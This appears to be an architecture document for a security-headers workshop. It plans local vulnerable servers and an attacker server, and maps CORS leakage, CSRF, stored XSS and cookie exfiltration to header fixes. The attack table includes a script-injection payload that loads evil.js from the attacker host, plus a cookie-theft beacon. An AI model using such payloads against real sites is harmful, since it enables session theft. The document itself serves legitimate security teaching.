# Demo Architecture — Security Headers Workshop

## Goal

Hands-on exercises where participants first watch an attack succeed against a
vulnerable server, then fix it themselves by editing a single, isolated
headers/config file — then re-run the attack to confirm it's blocked.

Four independent Node.js/Express servers run simultaneously on localhost, each
on its own port (different port = different origin, which is all SOP/CORS
care about — no need for different hostnames).

## Servers

| Server | Port | Role |
|---|---|---|
| `login-server` | 4000 | Issues the session cookie on login. Owns the cookie's `SameSite`/`HttpOnly`/`Secure` flags. |
| `api-server` | 4001 | `GET`/`POST` on the message list, gated by the session cookie. Owns CORS headers. |
| `frontend-server` | 3000 | Serves the "Secret Messageboard" UI (login, read list, add entry). Owns CSP. |
| `evil-server` | 5000 | Attacker-controlled origin: CORS-read demo, CSRF POST, evil script, image beacon, and a `/captured` viewer page showing everything it has stolen. |

Note: `login-server` and `api-server` are deliberately separate processes —
cookies are scoped by host, not port, so a cookie set by `login-server` is
still sent to `api-server` automatically. This is itself a small teaching
moment about cookie scoping vs. SOP/origin.

## Directory layout

```
demo/
  package.json              # npm workspaces root — one `npm install`, one start-all command
  servers/
    login-server/
      server.js             # route logic (untouched during exercises)
      headers.js            # cookie flags — THE file participants edit
    api-server/
      server.js
      headers.js             # CORS config — THE file participants edit
    frontend-server/
      server.js
      headers.js             # CSP config — THE file participants edit
      views/                 # server-rendered HTML templates
    evil-server/
      server.js              # attacker logic (not edited by participants)
  solutions/
    login-server/headers.js
    api-server/headers.js
    frontend-server/headers.js
```

`solutions/` holds only the corrected `headers.js` files — a fallback
reference for a stuck participant or presenter, copy-pasted over the
in-progress version to unblock and move on.

## Implementation style

- Plain Express + vanilla JS `fetch()` calls, server-rendered HTML, no
  frontend framework or build step — nothing should distract from the
  network/header behavior being demonstrated.
- npm workspaces at the root so setup is `npm install` once and
  `npm run start:all` (via `concurrently` or similar) to bring up all four
  servers together.

## The `headers.js` convention

Each of the three "real" servers (`login`, `api`, `frontend`) has a
`headers.js` that exports the security-relevant config and is applied as
middleware in `server.js`. This is the **only** file that differs between the
vulnerable and fixed state of an exercise — route/business logic never
changes. This keeps each fix a small, reviewable diff in one place.

`evil-server` has no `headers.js` — it's the attacker, not something
participants patch.

## Attack ↔ fix mapping

| Exercise | Attack (evil-server) | Vulnerable config | Fix (lives in) |
|---|---|---|---|
| CORS data leak | `fetch()` the api-server list with credentials, read the response | api-server `headers.js` reflects any `Origin` + `Allow-Credentials: true` | api-server `headers.js`: restrict `Access-Control-Allow-Origin` to the real frontend origin |
| CSRF write | Silent cross-origin POST adds a list entry (response unreadable, but write still succeeds) | login-server `headers.js`: cookie has no `SameSite` restriction | login-server `headers.js`: `SameSite=Strict` or `Lax`. *(CSRF token as a second, optional/advanced fix — not required to pass the exercise.)* |
| Stored XSS | Message-board entry contains `<script src="http://localhost:5000/evil.js">`, which executes in a victim's frontend session | frontend-server `headers.js` has no CSP (or allows remote scripts) | frontend-server `headers.js`: CSP `script-src` restricted to self — no output-encoding fix required for this exercise, CSP alone is the graded fix |
| Exfiltration / cookie theft | Evil image beacon logs hits; if the session cookie is readable, injected JS exfiltrates `document.cookie` via the beacon URL | login-server `headers.js`: cookie has no `HttpOnly` | login-server `headers.js`: add `HttpOnly` — theft fails even though the XSS still fires |

## Still open (to refine before/while implementing)

- Exact vulnerable/fixed header values and exact wording of each exercise's instructions.
- Exact endpoint paths and payload shapes for `api-server` and `evil-server`.
- Whether the CSRF-token bonus exercise gets its own file/instructions now or is deferred.
- Startup/reset flow details (e.g. does `npm run start:all` also reset in-memory state, or is restart manual per server).
- Exercise sequencing/wording for participants (separate from this architecture doc).
